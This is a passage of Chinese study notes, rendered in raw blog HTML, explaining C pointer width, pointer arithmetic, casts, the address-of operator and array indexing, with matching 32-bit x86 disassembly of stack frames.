class=\"number\">0040</span>D751 B8 CC CC CC CC       mov         eax,<span class=\"number\">0</span>CCCCCCCCh</span><br><span class=\"line\"><span class=\"number\">0040</span>D756 F3 AB                rep stos    dword ptr [edi]</span><br><span class=\"line\"><span class=\"number\">0040</span>D758 C7 <span class=\"number\">45</span> FC <span class=\"number\">01</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> mov         dword ptr [ebp<span class=\"number\">-4</span>],<span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D75F C7 <span class=\"number\">45</span> F8 <span class=\"number\">02</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> mov         dword ptr [ebp<span class=\"number\">-8</span>],<span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D766 C7 <span class=\"number\">45</span> F4 <span class=\"number\">03</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> mov         dword ptr [ebp<span class=\"number\">-0</span>Ch],<span class=\"number\">3</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D76D C7 <span class=\"number\">45</span> F0 <span class=\"number\">04</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> mov         dword ptr [ebp<span class=\"number\">-10</span>h],<span class=\"number\">4</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D774 C7 <span class=\"number\">45</span> EC <span class=\"number\">05</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> mov         dword ptr [ebp<span class=\"number\">-14</span>h],<span class=\"number\">5</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//带*类型变量赋值必须使用完整写法</span></span><br><span class=\"line\"><span class=\"comment\">//不加家多少个*，宽度永远是4字节</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//++/--加多少取决于类型减去一个*之后的数据宽度</span></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">func2</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">char</span>* x;</span><br><span class=\"line\">\t<span class=\"type\">short</span>* y;</span><br><span class=\"line\">\t<span class=\"type\">int</span>* z;</span><br><span class=\"line\"></span><br><span class=\"line\">\tx = (<span class=\"type\">char</span>*)<span class=\"number\">1</span>;</span><br><span class=\"line\">\ty = (<span class=\"type\">short</span>*)<span class=\"number\">2</span>;</span><br><span class=\"line\">\tz = (<span class=\"type\">int</span>*)<span class=\"number\">3</span>;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tx++;</span><br><span class=\"line\">\ty++;</span><br><span class=\"line\">\tz++;</span><br><span class=\"line\">\t<span class=\"comment\">//2,4,7</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d %d %d\\n&quot;</span>,x,y,z);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">char</span>** x1;</span><br><span class=\"line\">\t<span class=\"type\">short</span>** y1;</span><br><span class=\"line\">\t<span class=\"type\">int</span>** z1;</span><br><span class=\"line\"></span><br><span class=\"line\">\tx1 = (<span class=\"type\">char</span>**)<span class=\"number\">1</span>;</span><br><span class=\"line\">\ty1 = (<span class=\"type\">short</span>**)<span class=\"number\">2</span>;</span><br><span class=\"line\">\tz1 = (<span class=\"type\">int</span>**)<span class=\"number\">3</span>;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tx1++;</span><br><span class=\"line\">\ty1++;</span><br><span class=\"line\">\tz1++;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d %d %d\\n&quot;</span>,x1,y1,z1);</span><br><span class=\"line\">\t<span class=\"comment\">//5,6,7</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">\t<span class=\"type\">char</span>* x;</span><br><span class=\"line\">\t<span class=\"type\">short</span>* y;</span><br><span class=\"line\">\t<span class=\"type\">int</span>* z;</span><br><span class=\"line\"></span><br><span class=\"line\">\tx = (<span class=\"type\">char</span>*)<span class=\"number\">100</span>;</span><br><span class=\"line\">\ty = (<span class=\"type\">short</span>*)<span class=\"number\">100</span>;</span><br><span class=\"line\">\tz = (<span class=\"type\">int</span>*)<span class=\"number\">100</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\tx+=<span class=\"number\">5</span>;</span><br><span class=\"line\">\ty+=<span class=\"number\">5</span>;</span><br><span class=\"line\">\tz+=<span class=\"number\">5</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d %d %d\\n&quot;</span>,x,y,z);  <span class=\"comment\">//105 110 120</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">char</span>**** x;</span><br><span class=\"line\">\t<span class=\"type\">short</span>**** y;</span><br><span class=\"line\">\t<span class=\"type\">int</span>**** z;</span><br><span class=\"line\"></span><br><span class=\"line\">\tx = (<span class=\"type\">char</span>****)<span class=\"number\">100</span>;</span><br><span class=\"line\">\ty = (<span class=\"type\">short</span>****)<span class=\"number\">100</span>;</span><br><span class=\"line\">\tz = (<span class=\"type\">int</span>****)<span class=\"number\">100</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\tx+=<span class=\"number\">5</span>;</span><br><span class=\"line\">\ty+=<span class=\"number\">5</span>;</span><br><span class=\"line\">\tz+=<span class=\"number\">5</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d %d %d\\n&quot;</span>,x,y,z);  <span class=\"comment\">//120,120,120</span></span><br><span class=\"line\">总结:</span><br><span class=\"line\"><span class=\"number\">1.</span>带*类型的变量可以加、减一个整数，但不能乘或者除.</span><br><span class=\"line\"><span class=\"number\">2.</span>带*类型变量与其他整数相加或者相减时:</span><br><span class=\"line\"><span class=\"comment\">//带*类型变量＋N=带*类型变量+N(去掉一个*后类型的宽度)</span></span><br><span class=\"line\"><span class=\"comment\">//带*类型变量一N=带*类型变量–N(去掉一个*后类型的宽度)</span></span><br><span class=\"line\"> </span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">\tchar**** x;</span><br><span class=\"line\">\tchar**** y;</span><br><span class=\"line\"></span><br><span class=\"line\">\tx = (char****)200;</span><br><span class=\"line\">\ty = (char****)100;</span><br><span class=\"line\"></span><br><span class=\"line\">\tint a = x-y; </span><br><span class=\"line\"></span><br><span class=\"line\">\tprintf(&quot;%d \\n&quot;,a);  //25</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tchar* x;</span><br><span class=\"line\">\tchar* y;</span><br><span class=\"line\"></span><br><span class=\"line\">\tx = (char*)200;</span><br><span class=\"line\">\ty = (char*)100;</span><br><span class=\"line\"></span><br><span class=\"line\">\tint a = x-y;  //*相减结果为int</span><br><span class=\"line\"></span><br><span class=\"line\">\tprintf(&quot;%d \\n&quot;,a); //100</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tshort* x;</span><br><span class=\"line\">\tshort* y;</span><br><span class=\"line\"></span><br><span class=\"line\">\tx = (short*)200;</span><br><span class=\"line\">\ty = (short*)100;</span><br><span class=\"line\"></span><br><span class=\"line\">\tint a = x-y; </span><br><span class=\"line\"></span><br><span class=\"line\">\tprintf(&quot;%d \\n&quot;,a);   //50</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">总结:</span><br><span class=\"line\">1、两个类型相同的带*类型的变量可以进行减法操作</span><br><span class=\"line\">2、想减的结果要除以去掉一个*的数据的宽度.</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//带*的类型可以做大小比较</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\tshort**** x;</span><br><span class=\"line\">\tshort**** y;</span><br><span class=\"line\"></span><br><span class=\"line\">\tx = (short****)200;</span><br><span class=\"line\">\ty = (short****)100;</span><br><span class=\"line\"></span><br><span class=\"line\">\tif(x&gt;y)</span><br><span class=\"line\">\t\tprintf(&quot;1&quot;);    //1</span><br><span class=\"line\">\telse</span><br><span class=\"line\">\t\tprintf(&quot;2&quot;);</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">char** arr[10]    //40</span><br><span class=\"line\">0040D740 55                   push        ebp</span><br><span class=\"line\">0040D741 8B EC                mov         ebp,esp</span><br><span class=\"line\">0040D743 83 EC 68             sub         esp,68h    //0x68-0x40=0x28=40/4=10</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">struct Student</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint x;</span><br><span class=\"line\">\tint y;</span><br><span class=\"line\">&#125;; </span><br><span class=\"line\"></span><br><span class=\"line\">Student**** s;</span><br><span class=\"line\">s = (Student****)100;</span><br><span class=\"line\">s++;  //104</span><br><span class=\"line\">s += 2;  //112</span><br><span class=\"line\">s -= 3;  //100</span><br><span class=\"line\">s += 2.5;  //pointer on left; needs integral value on right</span><br><span class=\"line\"></span><br><span class=\"line\">Student**** s1;</span><br><span class=\"line\">Student**** s2;</span><br><span class=\"line\">int x;</span><br><span class=\"line\">s1 = (Student****)200;</span><br><span class=\"line\">s2 = (Student****)100;</span><br><span class=\"line\">x = s1-s2;  //25</span><br><span class=\"line\"></span><br><span class=\"line\">Student* s;</span><br><span class=\"line\">s = (Student*)100;</span><br><span class=\"line\">s++;  //108</span><br><span class=\"line\">s+=2;  //124</span><br><span class=\"line\">s-=3;  //100</span><br><span class=\"line\"></span><br><span class=\"line\">Student* s1;</span><br><span class=\"line\">Student* s2;</span><br><span class=\"line\">int x;</span><br><span class=\"line\">s1 = (Student*)200;</span><br><span class=\"line\">s2 = (Student*)100;</span><br><span class=\"line\">x=s1-s2  //12</span><br><span class=\"line\"></span><br><span class=\"line\">void func2()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">#if 0</span><br><span class=\"line\">\tStudent**** s;</span><br><span class=\"line\">\ts = (Student****)100;</span><br><span class=\"line\">\ts++;  </span><br><span class=\"line\">\tprintf(&quot;%d\\n&quot;,s);</span><br><span class=\"line\">\ts += 2;  </span><br><span class=\"line\">\tprintf(&quot;%d\\n&quot;,s);</span><br><span class=\"line\">\ts -= 3; </span><br><span class=\"line\">\tprintf(&quot;%d\\n&quot;,s);</span><br><span class=\"line\"></span><br><span class=\"line\">\tStudent**** s1;</span><br><span class=\"line\">\tStudent**** s2;</span><br><span class=\"line\">\tint x;</span><br><span class=\"line\">\ts1 = (Student****)200;</span><br><span class=\"line\">\ts2 = (Student****)100;</span><br><span class=\"line\">\tx = s1-s2; </span><br><span class=\"line\">\tprintf(&quot;%d\\n&quot;,x);</span><br><span class=\"line\"></span><br><span class=\"line\">\tStudent* s;</span><br><span class=\"line\">\ts = (Student*)100;</span><br><span class=\"line\">\ts++;  </span><br><span class=\"line\">\tprintf(&quot;%d\\n&quot;,s);</span><br><span class=\"line\">\ts+=2;  </span><br><span class=\"line\">\tprintf(&quot;%d\\n&quot;,s);</span><br><span class=\"line\">\ts-=3;  </span><br><span class=\"line\">\tprintf(&quot;%d\\n&quot;,s);</span><br><span class=\"line\"></span><br><span class=\"line\">\tStudent* s1;</span><br><span class=\"line\">\tStudent* s2;</span><br><span class=\"line\">\tint x;</span><br><span class=\"line\">\ts1 = (Student*)200;</span><br><span class=\"line\">\ts2 = (Student*)100;</span><br><span class=\"line\">\tx=s1-s2;  </span><br><span class=\"line\">\tprintf(&quot;%d\\n&quot;,x);</span><br><span class=\"line\"></span><br><span class=\"line\">\t#endif</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">Student**** 4</span><br><span class=\"line\">Student* 8</span><br><span class=\"line\"></span><br><span class=\"line\">Student s;</span><br><span class=\"line\">int x = (Studnet)s;   //x</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">struct Student</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint x;</span><br><span class=\"line\">\tint y;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">Student s;</span><br><span class=\"line\">int m = 10;</span><br><span class=\"line\">s = (Student)x;    //不能转，int不能和结构体类型互相转换</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">int* x;</span><br><span class=\"line\">Student* y;</span><br><span class=\"line\">x = (int*) 10;</span><br><span class=\"line\">y = (Student*)x;    //可以转</span><br><span class=\"line\"></span><br><span class=\"line\">int* x;</span><br><span class=\"line\">Student y;</span><br><span class=\"line\">x = (Studnet*)y;   //不能转</span><br><span class=\"line\"></span><br><span class=\"line\">&amp;是地址符，类型是其后面的类型加一个“*”，任何变量都可以使用来获取地址，但不能用在常量上。</span><br><span class=\"line\">&amp;可以取任何一个变量的地址</span><br><span class=\"line\">&amp;a 的类型是a的类型+*</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">char***** a = (char*****)10;</span><br><span class=\"line\">&amp;a = char******</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230125132226542.png\" alt=\"image-20230125132226542\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230125133522040.png\" alt=\"image-20230125133522040\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230221165556550.png\" alt=\"image-20230221165556550\"></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span>  x=<span class=\"number\">10</span>;</span><br><span class=\"line\"><span class=\"type\">int</span>* px = &amp;x;</span><br><span class=\"line\"><span class=\"type\">char</span> x1 = *px;</span><br><span class=\"line\">*x == x的类型减去一个*</span><br><span class=\"line\"></span><br><span class=\"line\">变量类型本来带*才能加*</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> arr[<span class=\"number\">5</span>] = &#123;<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>&#125;;   <span class=\"comment\">//开辟8个字节缓冲区</span></span><br><span class=\"line\"><span class=\"type\">int</span>* x = &amp;arr[<span class=\"number\">0</span>];   <span class=\"comment\">//第一个变量的地址</span></span><br><span class=\"line\"><span class=\"type\">int</span>* px = arr;      <span class=\"comment\">//两种等价的写法</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span>(<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i&lt;<span class=\"number\">5</span>;i++)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d &quot;</span>,arr[i]);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d &quot;</span>,*(px+i));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//px是int*类型，运算时去掉一个*,变为int类型，偏移时每次+4找到数组中对应位置，*在解引用</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">void func3()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tchar a = 10;</span><br><span class=\"line\">\tshort b = 20;</span><br><span class=\"line\">\tint c = 30;</span><br><span class=\"line\"></span><br><span class=\"line\">\tchar* pa = &amp;a;</span><br><span class=\"line\">\tshort* pb = &amp;b;</span><br><span class=\"line\">\tint* pc = &amp;c;</span><br><span class=\"line\"></span><br><span class=\"line\">\tchar** ppa = &amp;pa;</span><br><span class=\"line\">\tshort** ppb = &amp;pb;</span><br><span class=\"line\">\tint** ppc = &amp;pc;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">0040D740 55                   push        ebp</span><br><span class=\"line\">0040D741 8B EC                mov         ebp,esp</span><br><span class=\"line\">0040D743 83 EC 64             sub         esp,64h</span><br><span class=\"line\">0040D746 53                   push        ebx</span><br><span class=\"line\">0040D747 56                   push        esi</span><br><span class=\"line\">0040D748 57                   push        edi</span><br><span class=\"line\">0040D749 8D 7D 9C             lea         edi,[ebp-64h]</span><br><span class=\"line\">0040D74C B9 19 00 00 00       mov         ecx,19h</span><br><span class=\"line\">0040D751 B8 CC CC CC CC       mov         eax,0CCCCCCCCh</span><br><span class=\"line\">0040D756 F3 AB                rep stos    dword ptr [edi]</span><br><span class=\"line\"></span><br><span class=\"line\">0040D758 C6 45 FC 0A          mov         byte ptr [ebp-4],0Ah</span><br><span class=\"line\">0040D75C 66 C7 45 F8 14 00    mov         word ptr [ebp-8],offset func3+20h (0040d760)</span><br><span class=\"line\">0040D762 C7 45 F4 1E 00 00 00 mov         dword ptr [ebp-0Ch],1Eh</span><br><span class=\"line\">0040D769 8D 45 FC             lea         eax,[ebp-4]</span><br><span class=\"line\">0040D76C 89 45 F0             mov         dword ptr [ebp-10h],eax</span><br><span class=\"line\">0040D76F 8D 4D F8             lea         ecx,[ebp-8]</span><br><span class=\"line\">0040D772 89 4D EC             mov         dword ptr [ebp-14h],ecx</span><br><span class=\"line\">0040D775 8D 55 F4             lea         edx,[ebp-0Ch]</span><br><span class=\"line\">0040D778 89 55 E8             mov         dword ptr [ebp-18h],edx</span><br><span class=\"line\">0040D77B 8D 45 F0             lea         eax,[ebp-10h]</span><br><span class=\"line\">0040D77E 89 45 E4             mov         dword ptr [ebp-1Ch],eax</span><br><span class=\"line\">0040D781 8D 4D EC             lea         ecx,[ebp-14h]</span><br><span class=\"line\">0040D784 89 4D E0             mov         dword ptr [ebp-20h],ecx</span><br><span class=\"line\">0040D787 8D 55 E8             lea         edx,[ebp-18h]</span><br><span class=\"line\">0040D78A 89 55 DC             mov         dword ptr [ebp-24h],edx</span><br><span class=\"line\">0040D78D 5F                   pop         edi</span><br><span class=\"line\">0040D78E 5E                   pop         esi</span><br><span class=\"line\">0040D78F 5B                   pop         ebx</span><br><span class=\"line\">0040D790 8B E5                mov         esp,ebp</span><br><span class=\"line\">0040D792 5D                   pop         ebp</span><br><span class=\"line\">0040D793 C3                   ret</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">void func4()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint p = 10;</span><br><span class=\"line\">\tint******* p7;</span><br><span class=\"line\">\tint****** p6;</span><br><span class=\"line\">\tint***** p5;</span><br><span class=\"line\">\tint**** p4;</span><br><span class=\"line\">\tint*** p3;</span><br><span class=\"line\">\tint** p2;</span><br><span class=\"line\">\tint* p1;</span><br><span class=\"line\"></span><br><span 